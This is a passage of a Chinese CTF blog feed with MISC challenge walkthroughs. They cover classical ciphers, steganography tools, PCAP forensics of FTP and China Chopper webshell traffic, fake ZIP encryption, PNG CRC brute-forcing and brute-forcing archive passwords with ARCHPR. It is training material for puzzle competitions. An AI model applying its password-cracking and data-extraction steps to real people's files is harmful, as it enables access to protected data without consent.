src="https://s2.loli.net/2023/01/30/Gb2NnwPHVudrU4I.png" alt="image-20230130141414932"></p><p>将这里改为 <code>74</code> 即可：</p><p><img src="https://s2.loli.net/2023/01/30/awKjpyJdzfgXexR.png" alt="image-20230130141452506"></p><p>我们得到一张 png 图片，使用 <code>stegsolve</code> 在<code>blue 0 通道</code> 发现二维码：</p><img src="https://s2.loli.net/2023/01/30/9iLV3dbj6Q4gswA.png" alt="image-20230130141605723" style="zoom: 25%;" /><p>扫码获得：<code>ci&#123;v3erf_0tygidv2_fc0&#125;</code></p><p>可能是栅栏密码，我们解密一下，得到：<code>cyig&#123;ivd3ve2r_ff_c00t&#125;</code></p><p>这个很想<code>凯撒密码</code>，但是不是，</p><p>查阅资料得知了一个密码：**<code>维吉尼亚密码</code>**</p><blockquote><p><strong>凯撒密码</strong>中，字母表中的每一字母都会作一定的偏移。<br> 当偏移量为3时，A就转换为了D、B转换为了E……因为凯撒密码中所有字母的偏移量是一样的</p><p>【<strong>维吉尼亚密码</strong>】则是由一些偏移量不同的恺撒密码组成</p><p>为了生成密码，需要使用<strong>表格法</strong>。</p><p>这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。</p></blockquote><p><img src="https://s2.loli.net/2023/01/30/3FOonBsW4yzqluM.png" alt="在这里插入图片描述"></p><blockquote><p>例如，假设<strong>明文</strong>为：HEETIAN</p><p>  然后选择<strong>某一关键词并重复</strong>而得到<strong>密钥</strong>，如关键词为LAB时，密钥为：LABLABL</p><p>  对于明文的第一个字母H，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母S。<br>  类似地，明文第二个字母为E，在表格中使用对应的A行进行加密，得到密文第二个字母E。以此类推，可以得到：</p><p>  明文：HEETIAN</p><p>  密钥：LABLABL</p><p>  密文：SEFEIBY</p><p>  <strong>解密的过程则与加密相反。</strong><br>  例如：根据密钥第一个字母L所对应的L行字母表，发现密文第一个字母S位于H列，因而明文第一个字母为H。<br>  密钥第二个字母A对应A行字母表，而密文第二个字母E位于此行E列，因而明文第二个字母为E。以此类推便可得到明文。</p></blockquote><p>简单地说:【<strong>维吉尼亚密码</strong>】是由一些<strong>偏移量不同</strong>的恺撒密码组成，解密需要密钥。</p><p>因此我们可以进行解密，但是尝试之后，我们发现需要：先维吉尼亚密码解密，再栅栏解密。</p><img src="https://s2.loli.net/2023/01/30/hzVg76wmdoFRKvL.png" alt="image-20230130142443064" style="zoom:33%;" /><p>然后栅栏解密：</p><img src="https://s2.loli.net/2023/01/30/3QU1oKmEbgXWOhf.png" alt="image-20230130142527956" style="zoom:33%;" />]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MISC(第3页wp)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC(第2页wp)</title>
    <link href="/2023/08/24/MISC(%E7%AC%AC2%E9%A1%B5wp)/"/>
    <url>/2023/08/24/MISC(%E7%AC%AC2%E9%A1%B5wp)/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><blockquote><p>hint：某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p></blockquote><p>下载文件得到 <code>pcapng</code> 文件，使用 <code>wireshark</code> 分析。 我们查看http协议，追踪http数据流，发现账号密码：</p><img src="https://s2.loli.net/2022/12/28/R3vQDANm7dbCBPq.png" alt="image-20221228160632064" style="zoom:33%;" /><p>根据提示，将账号，密码串在一起，然后md5加密得到flag</p><img src="https://s2.loli.net/2022/12/28/YqZTuRlsaXFxgGO.png" alt="image-20221228160749576" style="zoom:33%;" /><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><blockquote><p>hint：浏览图片的时候刷新键有没有用呢</p></blockquote><p>下载后得到一张jpg图片，然后进行binwalk等操作，发现都没有用</p><p>这个时候，观察题目，刷新键是F5，我们经过查询，发现有一个 <code>F5隐写</code> 全称：<strong>F5-steganography</strong></p><p>然后有一款 F5隐写工具：<code>F5-steganography</code> 这款工具是基于java的</p><p>我们下载之后在命令行使用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java Extract /xxx/yyy       <span class="hljs-comment">//图片路径</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java Extract C:<span class="hljs-comment">//Users//LIKE//Desktop//Misc.jpg</span><br></code></pre></td></tr></table></figure><p>然后工具会将分割的文件放在 F5目录下的 output.txt中：</p><img src="https://s2.loli.net/2022/12/28/Q2GvzHB7ipn6bVT.png" alt="image-20221228162543845" style="zoom:33%;" /><p>打开发现是zip文件，改后缀为zip即可，打开发现zip伪加密，修改即可打开压缩包：</p><img src="https://s2.loli.net/2022/12/28/xHduBLpY4cGQeyV.png" alt="image-20221228162637137" style="zoom:33%;" /><h2 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h2><p>下载得到一个 xls 表格文件，拖进 010Editor 发现是zip格式：</p><img src="https://s2.loli.net/2022/12/28/RkbB7yYKlthJwIA.png" alt="image-20221228162954700" style="zoom:33%;" /><p>于是我们把 <code>xls</code> 后缀 改为zip  。发现里面很多文件：</p><p><img src="https://s2.loli.net/2022/12/28/LK3DWvpVirCwNJy.png" alt="image-20221228163037181"></p><p>我们在 <code>010Editor</code> 搜 <code>flag</code> 关键字</p><img src="https://s2.loli.net/2022/12/28/FB8jOaVo7TnrMW3.png" alt="image-20221228163119551" style="zoom:33%;" /><p>发现了 flag 的路径，找到打开得到 flag</p><h2 id="BJDCTF2020-藏藏藏"><a href="#BJDCTF2020-藏藏藏" class="headerlink" title="[BJDCTF2020]藏藏藏"></a>[BJDCTF2020]藏藏藏</h2><p>将图片拖进kali，使用 <code>foremost</code> 进行分离，得到zip文件，里面有一个 docx文档，打开有一个二维码，扫码得到flag</p><img src="https://s2.loli.net/2022/12/28/ndGaTeoyERs5pBc.png" alt="image-20221228170826564" style="zoom: 33%;" /><h2 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><blockquote><p>hint：一黑客入侵了某公司盗取了重要的机密文件，还好管理员记录了文件被盗走时的流量，请分析该流量，分析出该黑客盗走了什么文件。</p></blockquote><p>下载得到 <code>pcapng</code> 流量包文件，使用 <code>wireshark</code> 分析 ，由于hint说，盗走的是文件，于是我们锁定 <code>ftp 协议</code></p><p>（文件传输协议）</p><p><img src="https://s2.loli.net/2022/12/28/loGsU7SAOTcjqLf.png" alt="image-20221228171658046"></p><p>发现流量包存在 <code>flag.rar</code> 文件，于是我们使用 <code>binwalk</code> 分离数据包：</p><img src="https://s2.loli.net/2022/12/28/5nVFAo9ScQRewZC.png" alt="image-20221228171753014" style="zoom:50%;" /><p>分离得到一个rar文件，但是打开需要密码，由于没有任何线索，所以我们使用 <code>ARCHPR</code> 进行爆破</p><p>得到四位数密码，打开即flag</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>下载后发现一张图片，使用<code>foremost</code>分离图片，得到两个文件：</p><img src="https://s2.loli.net/2022/12/28/pI1gCUawLKD5JHR.png" alt="image-20221228175126582" style="zoom:33%;" /><p>key中内容为base64编码，解密后:</p><blockquote><p>What is Nicki Minaj’s favorite song that refers to snakes?</p></blockquote><p>查了一下，发现歌名：<code>anaconda</code>,猜测歌名可能是某个密码。</p><p>但是 cipher 文件不知道什么东西。经过查阅得知，蛇snake还有另一个单词：<code>serpent</code></p><p><strong>serpent 是一种编码</strong></p><p>我们使用网站解密：<a href="http://serpent.online-domain-tools.com/">serpent解密</a></p><img src="https://s2.loli.net/2022/12/28/sNH3OAUdRvSGQ1K.png" alt="image-20221228175550808" style="zoom: 25%;" /><p>key就是之前base64解密之后找到的：<code>anacoda</code></p><p>解密即可得到flag</p><h2 id="GXYCTF2019-佛系青年"><a href="#GXYCTF2019-佛系青年" class="headerlink" title="[GXYCTF2019]佛系青年"></a>[GXYCTF2019]佛系青年</h2><p>下载后得到 zip压缩包，解压需要密码，我们使用 <code>Ziperello</code> 扫一下，发现并无加密，为zip伪加密</p><p>于是我们使用 010Editor 打开对应zip，修改对应部分为 00：</p><img src="https://s2.loli.net/2022/12/28/XDuPdMC8oSyO2FL.png" alt="image-20221228180315918" style="zoom:33%;" /><p>打开txt文件，发现是一串佛语：</p><p><img src="https://s2.loli.net/2022/12/28/8Icvdxt9OusT2QF.png" alt="image-20221228180352402"></p><p>于是我们想到了<code>与佛论禅</code> 加密，<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">使用网站解密即可</a></p><img src="https://s2.loli.net/2022/12/28/xcuS1gI85eBMdQf.png" alt="image-20221228180454598" style="zoom:33%;" /><h2 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h2><p>将文件使用 010Editor 打开，最底下就是flag</p><img src="https://s2.loli.net/2022/12/28/a5McefyOjkuYVdI.png" alt="image-20221228180654293" style="zoom:33%;" /><h2 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h2><blockquote><p>hint：深夜里，Hack偷偷的潜入了某公司的内网，趁着深夜偷走了公司的秘密文件，公司的网络管理员通过通过监控工具成功的截取Hack入侵时数据流量，但是却无法分析出Hack到底偷走了什么机密<strong>文件</strong>，你能帮帮管理员分析出Hack到底偷走了什么机密文件吗？</p></blockquote><p>直接使用 <code>wireshark</code> 分析 <code>pcapng</code> 流量包，由于提示：偷走的为文件，所以我们查找<code>ftp协议</code></p><p><img src="https://s2.loli.net/2022/12/28/DCu65p87sSEyoUg.png" alt="image-20221228181342686"></p><p>发现数据包中存在rar压缩包，于是使用 <code>foremost</code> 提取rar压缩包</p><img src="https://s2.loli.net/2022/12/28/Gq7HdLJcAgIXs5w.png" alt="image-20221228181508305" style="zoom:33%;" /><p>得到rar压缩包后，使用 爆破工具 ARCHPR 爆破得到密码，打开得到flag</p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><blockquote><p>hint：流量分析，你能找到flag吗</p></blockquote><p>使用 <code>wireshark</code> 打开， 题目说菜刀，我们过滤POST流量包：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http.request.method<span class="hljs-operator">=</span><span class="hljs-operator">=</span>POST<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/28/N2vUCdLb1qMzyAf.png" alt="image-20221228201501614" style="zoom:33%;" /><p>打开数据包，发现有一个 zip压缩包，我们使用 <code>foremost</code> 分离</p><img src="https://s2.loli.net/2022/12/28/1cPxsXtQO3N9Gq2.png" alt="image-20221228201553960" style="zoom:33%;" /><p>得到zip压缩包，但是需要密码：</p><img src="https://s2.loli.net/2022/12/28/xlNb8HPGYVr6fAe.png" alt="image-20221228201625176" style="zoom: 33%;" /><p><img src="https://s2.loli.net/2022/12/28/Wnye5LPFqclIxiZ.png" alt="image-20221228201659046"></p><p>我们在<code>tcp.stream eq 7</code> 中发现大量数据，参数 z1 的值是base64编码，我们先url解码一下再base64解码：</p><p><img src="https://s2.loli.net/2022/12/28/UfoR5ViSpq7eAwZ.png" alt="image-20221228201818026"></p><p>得到16进制数据，但是我们不能直接保存为 jpg 图片，我们使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br>hex_data= <span class="hljs-string">&#x27;这里填16进制数据&#x27;</span><br>out=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>out.write(binascii.unhexlify(hex_data))<br>out.close()<br><span class="hljs-comment"># 16进制转图片</span><br></code></pre></td></tr></table></figure><p>得到图片：</p><img src="https://s2.loli.net/2022/12/28/nuYiLh1SgRABTHl.png" alt="image-20221228202004912" style="zoom:33%;" /><p>使用密码打开zip压缩包得到flag</p><h2 id="BJDCTF2020-just-a-rar"><a href="#BJDCTF2020-just-a-rar" class="headerlink" title="[BJDCTF2020]just_a_rar"></a>[BJDCTF2020]just_a_rar</h2><p>爆破压缩包，解压得到图片，flag在图片exif中：</p><img src="https://s2.loli.net/2022/12/28/hXVluYzZGcBRkM5.png" alt="image-20221228202436152" style="zoom:33%;" /><h2 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h2><p>下载得到两张gif图片，篮球副本图片显示不出来，我们使用 010Editor 打开两张GIF图片，</p><p>发现 副本图片缺少了 GIF 头：<code>47 49 46 38</code></p><img src="https://s2.loli.net/2022/12/28/kA5fhBbiTe3HV2W.png" alt="image-20221228203744974" style="zoom:33%;" /><p>我们加上并保存:</p><img src="https://s2.loli.net/2022/12/28/KWzNDZPoc4rS8aE.png" alt="image-20221228203821348" style="zoom:33%;" /><p>得到 flag</p><h2 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h2><img src="https://s2.loli.net/2022/12/28/MD9tfIXOdJCqyW2.png" alt="image-20221228203939542" style="zoom:33%;" /><p>使用 010Editor 打开图片，发现图片 <code>crc校验</code> 不匹配</p><p>我们使用大佬写的crc校验脚本，修改宽高：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\\Users\\LIKE\Desktop\\1.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> image_data:<br>    bin_data = image_data.read()<br>data = <span class="hljs-built_in">bytearray</span>(bin_data[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])  <span class="hljs-comment"># 这段数据就是png图中IHDR段的16进制数据，不包括开始的length和最后CRC</span><br>crc32key = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(bin_data[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>]).replace(<span class="hljs-string">r&#x27;\x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&quot;b&#x27;&quot;</span>, <span class="hljs-string">&#x27;0x&#x27;</span>).replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>))<br><span class="hljs-comment"># 理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span><br>n = <span class="hljs-number">4096</span><br><span class="hljs-comment"># 高和宽一起爆破</span><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-comment"># q为8字节，i为4字节，h为2字节</span><br>    width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, w))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, h))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data[x + <span class="hljs-number">4</span>] = width[x]<br>            data[x + <span class="hljs-number">8</span>] = height[x]<br>        crc32result = zlib.crc32(data)<br>        <span class="hljs-keyword">if</span> crc32result == crc32key:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;width:%s  height:%s&quot;</span> % (<span class="hljs-built_in">bytearray</span>(width).<span class="hljs-built_in">hex</span>(), <span class="hljs-built_in">bytearray</span>(height).<span class="hljs-built_in">hex</span>()))<br>            exit()<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/28/rwkeCa5Rjoch4YP.png" alt="image-20221228204958302" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/28/nNbPpauVQ9Cf4ER.png" alt="image-20221228205025551" style="zoom:33%;" /><p>修改一下得到flag</p><h2 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h2><p>将二维码使用 binwalk 分离，获得很多压缩包和文件，</p><img src="https://s2.loli.net/2022/12/28/WEp3tnfIe5hXPaD.png" alt="image-20221228210635038" style="zoom:33%;" /><p>打开flag.doc</p><p><img src="https://s2.loli.net/2022/12/28/3jH6G7zWLQpX8xC.png" alt="image-20221228210701815"></p><p>发现很多base64编码，由于被编码多次，我们使用脚本跑一下解码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">f</span>):<br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f = base64.b64decode(f)<br>            n += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]Base64共decode了&#123;0&#125;次，最终解码结果如下:&#x27;</span>.<span class="hljs-built_in">format</span>(n))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(f, <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C://Users//LIKE//Desktop//flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>    decode(f)<br></code></pre></td></tr></table></figure><p>得到: <code>comEON_YOuAreSOSoS0great</code></p><p>我们用得到的密码可以打开音频压缩包：<img src="https://s2.loli.net/2022/12/28/S9ghcjfPlQxYuTW.png" alt="image-20221228210935883" style="zoom:33%;" /></p><p>使用 <code>Audacity</code> 去分析，发现是莫斯电码</p><img src="https://s2.loli.net/2022/12/28/pViFw6jcQLKdO8u.png" alt="image-20221228211013822" style="zoom:33%;" /><p>解密莫斯电码得到 flag(转小写)</p><h2 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h2><p>下载后得到一张jpg图片，末尾有一串16进制数据：</p><img src="https://s2.loli.net/2022/12/28/OKyYvIocbCewlBP.png" alt="image-20221228212835117" style="zoom:33%;" /><p>将 <a href="https://www.sojson.com/hexadecimal.html">16进制转文本</a> ，得：</p><img src="https://s2.loli.net/2022/12/28/5rv4J13IaYxbPTp.png" alt="image-20221228212928002" style="zoom:33%;" /><p>根据图片的 <code>exif</code>信息，提示要画图：</p><img src="https://s2.loli.net/2022/12/28/GHT7CbOzKJP1N6c.png" alt="image-20221228213126640" style="zoom:33%;" /><p>因此，这可能是一串坐标。我们可以使用：<code>gnuplot</code> 绘图工具进行绘图</p><p>我们先把坐标转换为 <code>gnuplot</code> 可以识别的形式</p><img src="https://s2.loli.net/2022/12/28/FZAwcRUSXlYm7C2.png" alt="image-20221228213538724" style="zoom:33%;" /><p>然后我们使用 <code>gnuplot</code>  画图:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">plot</span> <span class="hljs-string">&quot;C://Users//LIKE//Desktop//1.txt&quot;</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/28/k7p1YWoFRK9GqlH.png" alt="image-20221228213718781" style="zoom:33%;" /><p>得到二维码，扫码得flag</p><h2 id="BJDCTF2020-纳尼"><a href="#BJDCTF2020-纳尼" class="headerlink" title="[BJDCTF2020]纳尼"></a>[BJDCTF2020]纳尼</h2><p>查看gif文件，发现缺少gif文件头</p><img src="https://s2.loli.net/2022/12/28/AsE38a9HTDu7Glv.png" alt="image-20221228214201186" style="zoom:33%;" /><p>我们添加文件头:</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">47 </span><span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/28/zqaErVIpoignb1e.png" alt="image-20221228214253254" style="zoom:33%;" /><p>得到一张gif，里面有base64编码，我们使用 <code>StegSolve</code> 的 <code>Data Extract</code> 模式</p><img src="https://s2.loli.net/2022/12/28/wRia8dUSjN4LoPp.png" alt="image-20221228214449359" style="zoom:33%;" /><p>获得每一帧编码:</p><img src="https://s2.loli.net/2022/12/28/LYVONkvBAyz9bQR.png" alt="image-20221228214538523" style="zoom:33%;" /><p>拼起来，然后base64解码得flag</p><h2 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h2><blockquote><p>hint：嫦娥当年奔月后，非常后悔，因为月宫太冷清，她想：早知道让后羿自己上来了，带了只兔子真是不理智。于是她就写了一首曲子，诉说的是怀念后羿在的日子。无数年后，小明听到了这首曲子，毅然决定冒充后羿。然而小明从曲子中听不出啥来，咋办。。（该题目为小写的32位字符，提交即可）</p></blockquote><p>使用 <code>Audacity</code>  分析，莫斯电码</p><h2 id="ACTF新生赛2020-outguess"><a href="#ACTF新生赛2020-outguess" class="headerlink" title="[ACTF新生赛2020]outguess"></a>[ACTF新生赛2020]outguess</h2><p>下载后得到一堆东西:</p><img src="https://s2.loli.net/2022/12/28/jNzoVqACpSZmDut.png" alt="image-20221228221425597" style="zoom:33%;" /><p>我们发现 mmm.jpg 的 exif 属性中有社会主义核心价值观，猜测是 <code>社会主义核心价值观加密</code></p><img src="https://s2.loli.net/2022/12/28/2jNgIfaBbx7Ho5P.png" alt="image-20221228221519913" style="zoom:33%;" /><p>解密得到: abc</p><p>然后就无思路了，然后题目 : <code>outguess</code></p><p>查询得知，有一种 <strong>outguess隐写</strong>：</p><p>kali下安装 <code>outguess 隐写工具</code> </p><p><strong>使用outguess</strong></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sas">输入outguess -help即可获得相关命令。<br>加密：<br>outguess -k “my secret <span class="hljs-keyword">key</span>” -d hidden.txt demo.jpg <span class="hljs-keyword">out</span>.jpg<br>加密之后，demo.jpg会覆盖<span class="hljs-keyword">out</span>.jpg，hidden.txt的内容是要隐藏的东西。<br>解密：<br>outguess -k “my secret <span class="hljs-keyword">key</span>” -r <span class="hljs-keyword">out</span>.jpg hidden.txt<br>解密之后，紧密内容放在hidden.txt中<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/28/32gIxf9OsZMU4mu.png" alt="image-20221228222800235"></p><p>key就是前面解码得到的 <code>abc</code></p><h2 id="HBNIS2018-excel破解"><a href="#HBNIS2018-excel破解" class="headerlink" title="[HBNIS2018]excel破解"></a>[HBNIS2018]excel破解</h2><p>下载得到一个excel，打开需要密码，我们用 010Editor 打开，直接搜索flag：</p><img src="https://s2.loli.net/2022/12/28/fjySKq4JHEt1AsM.png" alt="image-20221228223047269" style="zoom: 50%;" /><h2 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h2><p>打开下载的图片：</p><img src="https://s2.loli.net/2022/12/28/Lqru8jo5PD41hSF.png" alt="image-20221228223250642" style="zoom:33%;" /><p>使用莫斯电码解密即可</p><h2 id="谁赢了比赛？"><a href="#谁赢了比赛？" class="headerlink" title="谁赢了比赛？"></a>谁赢了比赛？</h2><blockquote><p>hint：小光非常喜欢下围棋。一天，他找到了一张棋谱，但是看不出到底是谁赢了。你能帮他看看到底是谁赢了么？</p></blockquote><p>下载得到一张围棋图片:</p><img src="https://s2.loli.net/2022/12/28/2mwcIlfnvsP5q4L.png" alt="image-20221228223914077" style="zoom:25%;" /><p>直接使用 <code>binwalk</code> 分离</p><img src="https://s2.loli.net/2022/12/28/AhknVLaWfo9i7Jm.png" alt="image-20221228223948505" style="zoom:33%;" /><p>得到一个需要密码的 rar压缩包，我们使用 <code>ARCHPR</code> 爆破 ，得到密码，打开发现一张gif图片：</p><img src="https://s2.loli.net/2022/12/28/qZEelaK45MUdIb3.png" alt="image-20221228224055977" style="zoom:25%;" /><p>我们使用 stegsolve(或者使用 <strong>GIFFrame</strong> ) 逐帧分析：</p><img src="https://s2.loli.net/2022/12/28/S7bJvinKhF6LsCe.png" alt="image-20221228224236256" style="zoom:25%;" /><p>发现第309帧不一样，我们保存这一张图片，然后使用 stegsolve 打开：</p><img src="https://s2.loli.net/2022/12/28/UpuMPLeIEsQxHyG.png" alt="image-20221228224414124" style="zoom:25%;" /><p>切换通道发现出现一张二维码，扫码得到flag</p><h2 id="SWPU2019-我有一只马里奥"><a href="#SWPU2019-我有一只马里奥" class="headerlink" title="[SWPU2019]我有一只马里奥"></a>[SWPU2019]我有一只马里奥</h2><p>下载得到一个 exe 文件，执行发现生成了1个txt文件:</p><img src="https://s2.loli.net/2022/12/28/KwLujm9qMRhtHxS.png" alt="image-20221228224831011" style="zoom: 33%;" /><img src="https://s2.loli.net/2022/12/28/IW1C9MGvXkKfQFt.png" alt="image-20221228224843095" style="zoom:33%;" /><p>txt提示 ntfs，查阅资料知：<strong>ntfs流隐写</strong></p><img src="https://s2.loli.net/2022/12/28/ZJehDH6noPA1gOG.png" alt="image-20221228225332134" style="zoom:33%;" /><p>查看方式:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">notepad <span class="hljs-number">1</span>.txt:flag.txt<br>notepad 查看的文件:隐写的文件<br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h2><p>查看图片 exif 属性：</p><img src="https://s2.loli.net/2022/12/28/GM2Z1BO7oxabcVq.png" alt="image-20221228225936303" style="zoom: 25%;" /><p>发现是盲文，<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">盲文解密</a> ，得到flag</p><img src="https://s2.loli.net/2022/12/28/bZG46cK2mxSEYwU.png" alt="image-20221228225816508" style="zoom:33%;" /><h2 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h2><p>下载后打开jpg图片，发现末尾藏有rar压缩包:</p><img src="https://s2.loli.net/2022/12/28/SswkA9EF5ZWav7q.png" alt="image-20221228230431265" style="zoom:33%;" /><p>使用 binwalk 分离，将分离后存在密码的rar文件爆破得到密码：</p><img src="https://s2.loli.net/2022/12/28/glGFMhWK9P12fXN.png" alt="image-20221228230610157" style="zoom:33%;" /><p>打开txt文件：</p><p><img src="https://s2.loli.net/2022/12/28/TG2nlDIUX1A98WR.png" alt="image-20221228230704492"></p><p>发现了毫无规律的字符组成</p><p>通过查询，我们知道可能是<strong>根据字符出现频率</strong>得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 